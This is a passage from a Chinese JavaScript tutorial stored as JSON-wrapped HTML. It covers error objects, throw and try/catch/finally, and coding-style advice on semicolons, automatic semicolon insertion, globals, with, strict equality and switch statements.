NaN\n+true // 1\n-false // 0</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/01/object-plus-object.html\">What is {} + {} in JavaScript?</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/04/quirk-implicit-conversion.html\">JavaScript quirk 1: implicit conversion of values</a></li>\n<li>Benjie Gillam, <a href=\"http://www.benjiegillam.com/2013/06/quantum-javascript/\">Quantum JavaScript?</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"错误处理机制","link":"/features/error.html"}],"content":"\n        <h1>\n            <a href='#错误处理机制' class='header-anchor'>#</a>\n            <span>错误处理机制</span>\n        </h1>\n    \n        <h2>\n            <a href='#Error-实例对象' class='header-anchor'>#</a>\n            <span>Error 实例对象</span>\n        </h2>\n    <p>JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供<code>Error</code>构造函数，所有抛出的错误都是这个构造函数的实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var err = new Error(&#039;出错了&#039;);\nerr.message // &quot;出错了&quot;</code></pre><p>上面代码中，我们调用<code>Error</code>构造函数，生成一个实例对象<code>err</code>。<code>Error</code>构造函数接受一个参数，表示错误提示，可以从实例的<code>message</code>属性读到这个参数。抛出<code>Error</code>实例对象以后，整个程序就中断在发生错误的地方，不再往下执行。</p>\n<p>JavaScript 语言标准只提到，<code>Error</code>实例对象必须有<code>message</code>属性，表示出错时的提示信息，没有提到其他属性。大多数 JavaScript 引擎，对<code>Error</code>实例还提供<code>name</code>和<code>stack</code>属性，分别表示错误的名称和错误的堆栈，但它们是非标准的，不是每种实现都有。</p>\n<ul>\n<li><strong>message</strong>：错误提示信息</li>\n<li><strong>name</strong>：错误名称（非标准属性）</li>\n<li><strong>stack</strong>：错误的堆栈（非标准属性）</li>\n</ul>\n<p>使用<code>name</code>和<code>message</code>这两个属性，可以对发生什么错误有一个大概的了解。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (error.name) {\n  console.log(error.name + &#039;: &#039; + error.message);\n}</code></pre><p><code>stack</code>属性用来查看错误发生时的堆栈。</p>\n<pre class=\"prettyprint language-javascript\"><code>function throwit() {\n  throw new Error(&#039;&#039;);\n}\n\nfunction catchit() {\n  try {\n    throwit();\n  } catch(e) {\n    console.log(e.stack); // print stack trace\n  }\n}\n\ncatchit()\n// Error\n//    at throwit (~/examples/throwcatch.js:9:11)\n//    at catchit (~/examples/throwcatch.js:3:9)\n//    at repl:1:5</code></pre><p>上面代码中，错误堆栈的最内层是<code>throwit</code>函数，然后是<code>catchit</code>函数，最后是函数的运行环境。</p>\n\n        <h2>\n            <a href='#原生错误类型' class='header-anchor'>#</a>\n            <span>原生错误类型</span>\n        </h2>\n    <p><code>Error</code>实例对象是最一般的错误类型，在它的基础上，JavaScript 还定义了其他6种错误对象。也就是说，存在<code>Error</code>的6个派生对象。</p>\n\n        <h3>\n            <a href='#SyntaxError-对象' class='header-anchor'>#</a>\n            <span>SyntaxError 对象</span>\n        </h3>\n    <p><code>SyntaxError</code>对象是解析代码时发生的语法错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 变量名错误\nvar 1a;\n// Uncaught SyntaxError: Invalid or unexpected token\n\n// 缺少括号\nconsole.log &#039;hello&#039;);\n// Uncaught SyntaxError: Unexpected string</code></pre><p>上面代码的错误，都是在语法解析阶段就可以发现，所以会抛出<code>SyntaxError</code>。第一个错误提示是“token 非法”，第二个错误提示是“字符串不符合要求”。</p>\n\n        <h3>\n            <a href='#ReferenceError-对象' class='header-anchor'>#</a>\n            <span>ReferenceError 对象</span>\n        </h3>\n    <p><code>ReferenceError</code>对象是引用一个不存在的变量时发生的错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 使用一个不存在的变量\nunknownVariable\n// Uncaught ReferenceError: unknownVariable is not defined</code></pre><p>另一种触发场景是，将一个值分配给无法分配的对象，比如对函数的运行结果或者<code>this</code>赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等号左侧不是变量\nconsole.log() = 1\n// Uncaught ReferenceError: Invalid left-hand side in assignment\n\n// this 对象不能手动赋值\nthis = 1\n// ReferenceError: Invalid left-hand side in assignment</code></pre><p>上面代码对函数<code>console.log</code>的运行结果和<code>this</code>赋值，结果都引发了<code>ReferenceError</code>错误。</p>\n\n        <h3>\n            <a href='#RangeError-对象' class='header-anchor'>#</a>\n            <span>RangeError 对象</span>\n        </h3>\n    <p><code>RangeError</code>对象是一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是<code>Number</code>对象的方法参数超出范围，以及函数堆栈超过最大值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 数组长度不得为负数\nnew Array(-1)\n// Uncaught RangeError: Invalid array length</code></pre>\n        <h3>\n            <a href='#TypeError-对象' class='header-anchor'>#</a>\n            <span>TypeError 对象</span>\n        </h3>\n    <p><code>TypeError</code>对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用<code>new</code>命令，就会抛出这种错误，因为<code>new</code>命令的参数应该是一个构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new 123\n// Uncaught TypeError: number is not a func\n\nvar obj = {};\nobj.unknownMethod()\n// Uncaught TypeError: obj.unknownMethod is not a function</code></pre><p>上面代码的第二种情况，调用对象不存在的方法，也会抛出<code>TypeError</code>错误，因为<code>obj.unknownMethod</code>的值是<code>undefined</code>，而不是一个函数。</p>\n\n        <h3>\n            <a href='#URIError-对象' class='header-anchor'>#</a>\n            <span>URIError 对象</span>\n        </h3>\n    <p><code>URIError</code>对象是 URI 相关函数的参数不正确时抛出的错误，主要涉及<code>encodeURI()</code>、<code>decodeURI()</code>、<code>encodeURIComponent()</code>、<code>decodeURIComponent()</code>、<code>escape()</code>和<code>unescape()</code>这六个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>decodeURI(&#039;%2&#039;)\n// URIError: URI malformed</code></pre>\n        <h3>\n            <a href='#EvalError-对象' class='header-anchor'>#</a>\n            <span>EvalError 对象</span>\n        </h3>\n    <p><code>eval</code>函数没有被正确执行时，会抛出<code>EvalError</code>错误。该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留。</p>\n\n        <h3>\n            <a href='#总结' class='header-anchor'>#</a>\n            <span>总结</span>\n        </h3>\n    <p>以上这6种派生错误，连同原始的<code>Error</code>对象，都是构造函数。开发者可以使用它们，手动生成错误对象的实例。这些构造函数都接受一个函数，代表错误提示信息（message）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var err1 = new Error(&#039;出错了！&#039;);\nvar err2 = new RangeError(&#039;出错了，变量超出有效范围！&#039;);\nvar err3 = new TypeError(&#039;出错了，变量类型无效！&#039;);\n\nerr1.message // &quot;出错了！&quot;\nerr2.message // &quot;出错了，变量超出有效范围！&quot;\nerr3.message // &quot;出错了，变量类型无效！&quot;</code></pre>\n        <h2>\n            <a href='#自定义错误' class='header-anchor'>#</a>\n            <span>自定义错误</span>\n        </h2>\n    <p>除了 JavaScript 原生提供的七种错误对象，还可以定义自己的错误对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function UserError(message) {\n  this.message = message || &#039;默认信息&#039;;\n  this.name = &#039;UserError&#039;;\n}\n\nUserError.prototype = new Error();\nUserError.prototype.constructor = UserError;</code></pre><p>上面代码自定义一个错误对象<code>UserError</code>，让它继承<code>Error</code>对象。然后，就可以生成这种自定义类型的错误了。</p>\n<pre class=\"prettyprint language-javascript\"><code>new UserError(&#039;这是自定义的错误！&#039;);</code></pre>\n        <h2>\n            <a href='#throw-语句' class='header-anchor'>#</a>\n            <span>throw 语句</span>\n        </h2>\n    <p><code>throw</code>语句的作用是手动中断程序执行，抛出一个错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (x &lt; 0) {\n  throw new Error(&#039;x 必须为正数&#039;);\n}\n// Uncaught ReferenceError: x is not defined</code></pre><p>上面代码中，如果变量<code>x</code>小于<code>0</code>，就手动抛出一个错误，告诉用户<code>x</code>的值不正确，整个程序就会在这里中断执行。可以看到，<code>throw</code>抛出的错误就是它的参数，这里是一个<code>Error</code>实例。</p>\n<p><code>throw</code>也可以抛出自定义错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>function UserError(message) {\n  this.message = message || &#039;默认信息&#039;;\n  this.name = &#039;UserError&#039;;\n}\n\nthrow new UserError(&#039;出错了！&#039;);\n// Uncaught UserError {message: &quot;出错了！&quot;, name: &quot;UserError&quot;}</code></pre><p>上面代码中，<code>throw</code>抛出的是一个<code>UserError</code>实例。</p>\n<p>实际上，<code>throw</code>可以抛出任何类型的值。也就是说，它的参数可以是任何值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 抛出一个字符串\nthrow &#039;Error！&#039;;\n// Uncaught Error！\n\n// 抛出一个数值\nthrow 42;\n// Uncaught 42\n\n// 抛出一个布尔值\nthrow true;\n// Uncaught true\n\n// 抛出一个对象\nthrow {\n  toString: function () {\n    return &#039;Error!&#039;;\n  }\n};\n// Uncaught {toString: ƒ}</code></pre><p>对于 JavaScript 引擎来说，遇到<code>throw</code>语句，程序就中止了。引擎会接收到<code>throw</code>抛出的信息，可能是一个错误实例，也可能是其他类型的值。</p>\n\n        <h2>\n            <a href='#try...catch-结构' class='header-anchor'>#</a>\n            <span>try...catch 结构</span>\n        </h2>\n    <p>一旦发生错误，程序就中止执行了。JavaScript 提供了<code>try...catch</code>结构，允许对错误进行处理，选择是否往下执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  throw new Error(&#039;出错了!&#039;);\n} catch (e) {\n  console.log(e.name + &quot;: &quot; + e.message);\n  console.log(e.stack);\n}\n// Error: 出错了!\n//   at &lt;anonymous&gt;:3:9\n//   ...</code></pre><p>上面代码中，<code>try</code>代码块抛出错误（上例用的是<code>throw</code>语句），JavaScript 引擎就立即把代码的执行，转到<code>catch</code>代码块，或者说错误被<code>catch</code>代码块捕获了。<code>catch</code>接受一个参数，表示<code>try</code>代码块抛出的值。</p>\n<p>如果你不确定某些代码是否会报错，就可以把它们放在<code>try...catch</code>代码块之中，便于进一步对错误进行处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  f();\n} catch(e) {\n  // 处理错误\n}</code></pre><p>上面代码中，如果函数<code>f</code>执行报错，就会进行<code>catch</code>代码块，接着对错误进行处理。</p>\n<p><code>catch</code>代码块捕获错误之后，程序不会中断，会按照正常流程继续执行下去。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  throw &quot;出错了&quot;;\n} catch (e) {\n  console.log(111);\n}\nconsole.log(222);\n// 111\n// 222</code></pre><p>上面代码中，<code>try</code>代码块抛出的错误，被<code>catch</code>代码块捕获后，程序会继续向下执行。</p>\n<p><code>catch</code>代码块之中，还可以再抛出错误，甚至使用嵌套的<code>try...catch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 100;\n\ntry {\n  throw n;\n} catch (e) {\n  if (e &lt;= 50) {\n    // ...\n  } else {\n    throw e;\n  }\n}\n// Uncaught 100</code></pre><p>上面代码中，<code>catch</code>代码之中又抛出了一个错误。</p>\n<p>为了捕捉不同类型的错误，<code>catch</code>代码块之中可以加入判断语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>try {\n  foo.bar();\n} catch (e) {\n  if (e instanceof EvalError) {\n    console.log(e.name + &quot;: &quot; + e.message);\n  } else if (e instanceof RangeError) {\n    console.log(e.name + &quot;: &quot; + e.message);\n  }\n  // ...\n}</code></pre><p>上面代码中，<code>catch</code>捕获错误之后，会判断错误类型（<code>EvalError</code>还是<code>RangeError</code>），进行不同的处理。</p>\n\n        <h2>\n            <a href='#finally-代码块' class='header-anchor'>#</a>\n            <span>finally 代码块</span>\n        </h2>\n    <p><code>try...catch</code>结构允许在最后添加一个<code>finally</code>代码块，表示不管是否出现错误，都必需在最后运行的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>function cleansUp() {\n  try {\n    throw new Error(&#039;出错了……&#039;);\n    console.log(&#039;此行不会执行&#039;);\n  } finally {\n    console.log(&#039;完成清理工作&#039;);\n  }\n}\n\ncleansUp()\n// 完成清理工作\n// Error: 出错了……</code></pre><p>上面代码中，由于没有<code>catch</code>语句块，所以错误没有捕获。执行<code>finally</code>代码块以后，程序就中断在错误抛出的地方。</p>\n<pre class=\"prettyprint language-javascript\"><code>function idle(x) {\n  try {\n    console.log(x);\n    return &#039;result&#039;;\n  } finally {\n    console.log(&quot;FINALLY&quot;);\n  }\n}\n\nidle(&#039;hello&#039;)\n// hello\n// FINALLY\n// &quot;result&quot;</code></pre><p>上面代码说明，<code>try</code>代码块没有发生错误，而且里面还包括<code>return</code>语句，但是<code>finally</code>代码块依然会执行。注意，只有在其执行完毕后，才会显示<code>return</code>语句的值。</p>\n<p>下面的例子说明，<code>return</code>语句的执行是排在<code>finally</code>代码之前，只是等<code>finally</code>代码执行完毕后才返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var count = 0;\nfunction countUp() {\n  try {\n    return count;\n  } finally {\n    count++;\n  }\n}\n\ncountUp()\n// 0\ncount\n// 1</code></pre><p>上面代码说明，<code>return</code>语句的<code>count</code>的值，是在<code>finally</code>代码块运行之前就获取了。</p>\n<p>下面是<code>finally</code>代码块用法的典型场景。</p>\n<pre class=\"prettyprint language-javascript\"><code>openFile();\n\ntry {\n  writeFile(Data);\n} catch(e) {\n  handleError(e);\n} finally {\n  closeFile();\n}</code></pre><p>上面代码首先打开一个文件，然后在<code>try</code>代码块中写入文件，如果没有发生错误，则运行<code>finally</code>代码块关闭文件；一旦发生错误，则先使用<code>catch</code>代码块处理错误，再使用<code>finally</code>代码块关闭文件。</p>\n<p>下面的例子充分反映了<code>try...catch...finally</code>这三者之间的执行顺序。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  try {\n    console.log(0);\n    throw &#039;bug&#039;;\n  } catch(e) {\n    console.log(1);\n    return true; // 这句原本会延迟到 finally 代码块结束再执行\n    console.log(2); // 不会运行\n  } finally {\n    console.log(3);\n    return false; // 这句会覆盖掉前面那句 return\n    console.log(4); // 不会运行\n  }\n\n  console.log(5); // 不会运行\n}\n\nvar result = f();\n// 0\n// 1\n// 3\n\nresult\n// false</code></pre><p>上面代码中，<code>catch</code>代码块结束执行之前，会先执行<code>finally</code>代码块。</p>\n<p><code>catch</code>代码块之中，触发转入<code>finally</code>代码快的标志，不仅有<code>return</code>语句，还有<code>throw</code>语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  try {\n    throw &#039;出错了！&#039;;\n  } catch(e) {\n    console.log(&#039;捕捉到内部错误&#039;);\n    throw e; // 这句原本会等到finally结束再执行\n  } finally {\n    return false; // 直接返回\n  }\n}\n\ntry {\n  f();\n} catch(e) {\n  // 此处不会执行\n  console.log(&#039;caught outer &quot;bogus&quot;&#039;);\n}\n\n//  捕捉到内部错误</code></pre><p>上面代码中，进入<code>catch</code>代码块之后，一遇到<code>throw</code>语句，就会去执行<code>finally</code>代码块，其中有<code>return false</code>语句，因此就直接返回了，不再会回去执行<code>catch</code>代码块剩下的部分了。</p>\n\n        <h2>\n            <a href='#参考连接' class='header-anchor'>#</a>\n            <span>参考连接</span>\n        </h2>\n    <ul>\n<li>Jani Hartikainen, <a href=\"http://davidwalsh.name/fix-javascript-errors\">JavaScript Errors and How to Fix Them</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"语法专题","link":"javascript:void(0)"},{"title":"编程风格","link":"/features/style.html"}],"content":"\n        <h1>\n            <a href='#编程风格' class='header-anchor'>#</a>\n            <span>编程风格</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>”编程风格“（programming style）指的是编写代码的样式规则。不同的程序员，往往有不同的编程风格。</p>\n<p>有人说，编译器的规范叫做”语法规则“（grammar），这是程序员必须遵守的；而编译器忽略的部分，就叫”编程风格“（programming style），这是程序员可以自由选择的。这种说法不完全正确，程序员固然可以自由选择编程风格，但是好的编程风格有助于写出质量更高、错误更少、更易于维护的程序。</p>\n<p>所以，编程风格的选择不应该基于个人爱好、熟悉程度、打字量等因素，而要考虑如何尽量使代码清晰易读、减少出错。你选择的，不是你喜欢的风格，而是一种能够清晰表达你的意图的风格。这一点，对于 JavaScript 这种语法自由度很高的语言尤其重要。</p>\n<p>必须牢记的一点是，如果你选定了一种“编程风格”，就应该坚持遵守，切忌多种风格混用。如果你加入他人的项目，就应该遵守现有的风格。</p>\n\n        <h2>\n            <a href='#缩进' class='header-anchor'>#</a>\n            <span>缩进</span>\n        </h2>\n    <p>行首的空格和 Tab 键，都可以产生代码缩进效果（indent）。</p>\n<p>Tab 键可以节省击键次数，但不同的文本编辑器对 Tab 的显示不尽相同，有的显示四个空格，有的显示两个空格，所以有人觉得，空格键可以使得显示效果更统一。</p>\n<p>无论你选择哪一种方法，都是可以接受的，要做的就是始终坚持这一种选择。不要一会使用 Tab 键，一会使用空格键。</p>\n\n        <h2>\n            <a href='#区块' class='header-anchor'>#</a>\n            <span>区块</span>\n        </h2>\n    <p>如果循环和判断的代码体只有一行，JavaScript 允许该区块（block）省略大括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a)\n  b();\n  c();</code></pre><p>上面代码的原意可能是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a) {\n  b();\n  c();\n}</code></pre><p>但是，实际效果却是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a) {\n  b();\n}\n  c();</code></pre><p>因此，建议总是使用大括号表示区块。</p>\n<p>另外，区块起首的大括号的位置，有许多不同的写法。最流行的有两种，一种是起首的大括号另起一行。</p>\n<pre class=\"prettyprint language-javascript\"><code>block\n{\n  // ...\n}</code></pre><p>另一种是起首的大括号跟在关键字的后面。</p>\n<pre class=\"prettyprint language-javascript\"><code>block {\n  // ...\n}</code></pre><p>一般来说，这两种写法都可以接受。但是，JavaScript 要使用后一种，因为 JavaScript 会自动添加句末的分号，导致一些难以察觉的错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>return\n{\n  key: value\n};\n\n// 相当于\nreturn;\n{\n  key: value\n};</code></pre><p>上面的代码的原意，是要返回一个对象，但实际上返回的是<code>undefined</code>，因为 JavaScript 自动在<code>return</code>语句后面添加了分号。为了避免这一类错误，需要写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>return {\n  key : value\n};</code></pre><p>因此，表示区块起首的大括号，不要另起一行。</p>\n\n        <h2>\n            <a href='#圆括号' class='header-anchor'>#</a>\n            <span>圆括号</span>\n        </h2>\n    <p>圆括号（parentheses）在 JavaScript 中有两种作用，一种表示函数的调用，另一种表示表达式的组合（grouping）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 圆括号表示函数的调用\nconsole.log(&#039;abc&#039;);\n\n// 圆括号表示表达式的组合\n(1 + 2) * 3</code></pre><p>建议可以用空格，区分这两种不同的括号。</p>\n<blockquote>\n<ol>\n<li><p>表示函数调用时，函数名与左括号之间没有空格。</p>\n</li>\n<li><p>表示函数定义时，函数名与左括号之间没有空格。</p>\n</li>\n<li><p>其他情况时，前面位置的语法元素与左括号之间，都有一个空格。</p>\n</li>\n</ol>\n</blockquote>\n<p>按照上面的规则，下面的写法都是不规范的。</p>\n<pre class=\"prettyprint language-javascript\"><code>foo (bar)\nreturn(a+b);\nif(a === 0) {...}\nfunction foo (b) {...}\nfunction(x) {...}</code></pre><p>上面代码的最后一行是一个匿名函数，<code>function</code>是语法关键字，不是函数名，所以与左括号之间应该要有一个空格。</p>\n\n        <h2>\n            <a href='#行尾的分号' class='header-anchor'>#</a>\n            <span>行尾的分号</span>\n        </h2>\n    <p>分号表示一条语句的结束。JavaScript 允许省略行尾的分号。事实上，确实有一些开发者行尾从来不写分号。但是，由于下面要讨论的原因，建议还是不要省略这个分号。</p>\n\n        <h3>\n            <a href='#不使用分号的情况' class='header-anchor'>#</a>\n            <span>不使用分号的情况</span>\n        </h3>\n    <p>首先，以下三种情况，语法规定本来就不需要在结尾添加分号。</p>\n<p><strong>（1）for 和 while 循环</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>for ( ; ; ) {\n} // 没有分号\n\nwhile (true) {\n} // 没有分号</code></pre><p>注意，<code>do...while</code>循环是有分号的。</p>\n<pre class=\"prettyprint language-javascript\"><code>do {\n  a--;\n} while(a &gt; 0); // 分号不能省略</code></pre><p><strong>（2）分支语句：if，switch，try</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>if (true) {\n} // 没有分号\n\nswitch () {\n} // 没有分号\n\ntry {\n} catch {\n} // 没有分号</code></pre><p><strong>（3）函数的声明语句</strong></p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n} // 没有分号</code></pre><p>注意，函数表达式仍然要使用分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function f() {\n};</code></pre><p>以上三种情况，如果使用了分号，并不会出错。因为，解释引擎会把这个分号解释为空语句。</p>\n\n        <h3>\n            <a href='#分号的自动添加' class='header-anchor'>#</a>\n            <span>分号的自动添加</span>\n        </h3>\n    <p>除了上一节的三种情况，所有语句都应该使用分号。但是，如果没有使用分号，大多数情况下，JavaScript 会自动添加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1\n// 等同于\nvar a = 1;</code></pre><p>这种语法特性被称为“分号的自动添加”（Automatic Semicolon Insertion，简称 ASI）。</p>\n<p>因此，有人提倡省略句尾的分号。麻烦的是，如果下一行的开始可以与本行的结尾连在一起解释，JavaScript 就不会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 var a = 3\nvar\na\n=\n3\n\n// 等同于 &#039;abc&#039;.length\n&#039;abc&#039;\n.length\n\n// 等同于 return a + b;\nreturn a +\nb;\n\n// 等同于 obj.foo(arg1, arg2);\nobj.foo(arg1,\narg2);\n\n// 等同于 3 * 2 + 10 * (27 / 6)\n3 * 2\n+\n10 * (27 / 6)</code></pre><p>上面代码都会多行放在一起解释，不会每一行自动添加分号。这些例子还是比较容易看出来的，但是下面这个例子就不那么容易看出来了。</p>\n<pre class=\"prettyprint language-javascript\"><code>x = y\n(function () {\n  // ...\n})();\n\n// 等同于\nx = y(function () {...})();</code></pre><p>下面是更多不会自动添加分号的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 引擎解释为 c(d+e)\nvar a = b + c\n(d+e).toString();\n\n// 引擎解释为 a = b/hi/g.exec(c).map(d)\n// 正则表达式的斜杠，会当作除法运算符\na = b\n/hi/g.exec(c).map(d);\n\n// 解释为&#039;b&#039;[&#039;red&#039;, &#039;green&#039;]，\n// 即把字符串当作一个数组，按索引取值\nvar a = &#039;b&#039;\n[&#039;red&#039;, &#039;green&#039;].forEach(function (c) {\n  console.log(c);\n})\n\n// 解释为 function (x) { return x }(a++)\n// 即调用匿名函数，结果f等于0\nvar a = 0;\nvar f = function (x) { return x }\n(a++)</code></pre><p>只有下一行的开始与本行的结尾，无法放在一起解释，JavaScript 引擎才会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a &lt; 0) a = 0\nconsole.log(a)\n\n// 等同于下面的代码，\n// 因为 0console 没有意义\nif (a &lt; 0) a = 0;\nconsole.log(a)</code></pre><p>另外，如果一行的起首是“自增”（<code>++</code>）或“自减”（<code>--</code>）运算符，则它们的前面会自动添加分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b = c = 1\n\na\n++\nb\n--\nc\n\nconsole.log(a, b, c)\n// 1 2 0</code></pre><p>上面代码之所以会得到<code>1 2 0</code>的结果，原因是自增和自减运算符前，自动加上了分号。上面的代码实际上等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b = c = 1;\na;\n++b;\n--c;</code></pre><p>如果<code>continue</code>、<code>break</code>、<code>return</code>和<code>throw</code>这四个语句后面，直接跟换行符，则会自动添加分号。这意味着，如果<code>return</code>语句返回的是一个对象的字面量，起首的大括号一定要写在同一行，否则得不到预期结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>return\n{ first: &#039;Jane&#039; };\n\n// 解释成\nreturn;\n{ first: &#039;Jane&#039; };</code></pre><p>由于解释引擎自动添加分号的行为难以预测，因此编写代码的时候不应该省略行尾的分号。</p>\n<p>不应该省略结尾的分号，还有一个原因。有些 JavaScript 代码压缩器（uglifier）不会自动添加分号，因此遇到没有分号的结尾，就会让代码保持原状，而不是压缩成一行，使得压缩无法得到最优的结果。</p>\n<p>另外，不写结尾的分号，可能会导致脚本合并出错。所以，有的代码库在第一行语句开始前，会加上一个分号。</p>\n<pre class=\"prettyprint language-javascript\"><code>;var a = 1;\n// ...</code></pre><p>上面这种写法就可以避免与其他脚本合并时，排在前面的脚本最后一行语句没有分号，导致运行出错的问题。</p>\n\n        <h2>\n            <a href='#全局变量' class='header-anchor'>#</a>\n            <span>全局变量</span>\n        </h2>\n    <p>JavaScript 最大的语法缺点，可能就是全局变量对于任何一个代码块，都是可读可写。这对代码的模块化和重复使用，非常不利。</p>\n<p>因此，建议避免使用全局变量。如果不得不使用，可以考虑用大写字母表示变量名，这样更容易看出这是全局变量，比如<code>UPPER_CASE</code>。</p>\n\n        <h2>\n            <a href='#变量声明' class='header-anchor'>#</a>\n            <span>变量声明</span>\n        </h2>\n    <p>JavaScript 会自动将变量声明”提升“（hoist）到代码块（block）的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (!x) {\n  var x = {};\n}\n\n// 等同于\nvar x;\nif (!x) {\n  x = {};\n}</code></pre><p>这意味着，变量<code>x</code>是<code>if</code>代码块之前就存在了。为了避免可能出现的问题，最好把变量声明都放在代码块的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; 10; i++) {\n  // ...\n}\n\n// 写成\nvar i;\nfor (i = 0; i &lt; 10; i++) {\n  // ...\n}</code></pre><p>上面这样的写法，就容易看出存在一个全局的循环变量<code>i</code>。</p>\n<p>另外，所有函数都应该在使用之前定义。函数内部的变量声明，都应该放在函数的头部。</p>\n\n        <h2>\n            <a href='#with-语句' class='header-anchor'>#</a>\n            <span>with 语句</span>\n        </h2>\n    <p><code>with</code>可以减少代码的书写，但是会造成混淆。</p>\n<pre class=\"prettyprint language-javascript\"><code>with (o) {\n　foo = bar;\n}</code></pre><p>上面的代码，可以有四种运行结果：</p>\n<pre class=\"prettyprint language-javascript\"><code>o.foo = bar;\no.foo = o.bar;\nfoo = bar;\nfoo = o.bar;</code></pre><p>这四种结果都可能发生，取决于不同的变量是否有定义。因此，不要使用<code>with</code>语句。</p>\n\n        <h2>\n            <a href='#相等和严格相等' class='header-anchor'>#</a>\n            <span>相等和严格相等</span>\n        </h2>\n    <p>JavaScript 有两个表示相等的运算符：”相等“（<code>==</code>）和”严格相等“（<code>===</code>）。</p>\n<p>相等运算符会自动转换变量类型，造成很多意想不到的情况。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 == &#039;&#039;// true\n1 == true // true\n2 == true // false\n0 == &#039;0&#039; // true\nfalse == &#039;false&#039; // false\nfalse == &#039;0&#039; // true\n&#039; \\t\\r\\n &#039; == 0 // true</code></pre><p>因此，建议不要使用相等运算符（<code>==</code>），只使用严格相等运算符（<code>===</code>）。</p>\n\n        <h2>\n            <a href='#语句的合并' class='header-anchor'>#</a>\n            <span>语句的合并</span>\n        </h2>\n    <p>有些程序员追求简洁，喜欢合并不同目的的语句。比如，原来的语句是</p>\n<pre class=\"prettyprint language-javascript\"><code>a = b;\nif (a) {\n  // ...\n}</code></pre><p>他喜欢写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (a = b) {\n  // ...\n}</code></pre><p>虽然语句少了一行，但是可读性大打折扣，而且会造成误读，让别人误解这行代码的意思是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if （a === b）{\n  // ...\n}</code></pre><p>建议不要将不同目的的语句，合并成一行。</p>\n\n        <h2>\n            <a href='#自增和自减运算符' class='header-anchor'>#</a>\n            <span>自增和自减运算符</span>\n        </h2>\n    <p>自增（<code>++</code>）和自减（<code>--</code>）运算符，放在变量的前面或后面，返回的值不一样，很容易发生错误。事实上，所有的<code>++</code>运算符都可以用<code>+= 1</code>代替。</p>\n<pre class=\"prettyprint language-javascript\"><code>++x\n// 等同于\nx += 1;</code></pre><p>改用<code>+= 1</code>，代码变得更清晰了。</p>\n<p>建议自增（<code>++</code>）和自减（<code>--</code>）运算符尽量使用<code>+=</code>和<code>-=</code>代替。</p>\n\n        <h2>\n            <a href='#switch...case-结构' class='header-anchor'>#</a>\n            <span>switch...case 结构</span>\n        </h2>\n    <p><code>switch...case</code>结构要求，在每一个<code>case</code>的最后一行必须是<code>break</code>语句，否则会接着运行下一个<code>case</code>。这样不仅容易忘记，还会造成代码的冗长。</p>\n<p>而且，<code>switch...case</code>不使用大括号，不利于代码形式的统一。此外，这种结构类似于<code>goto</code>语句，容易造成程序流程的混乱，使得代码结构混乱不堪，不符合面向对象编程的原则。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doAction(action) {\n  switch (action) {\n    case &#039;hack&#039;:\n      return &#039;hack&#039;;\n      break;\n    case &#039;slash&#039;:\n      return &#039;slash&#039;;\n      break;\n    case &#039;run&#039;:\n      return &#039;run&#039;;\n      break;\n    default:\n      throw new Error(&#039;Invalid action.&#039;);\n  }\n}</code></pre><p>上面的代码建议改写成对象结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>function doAction(action) {\n  var actions = {\n    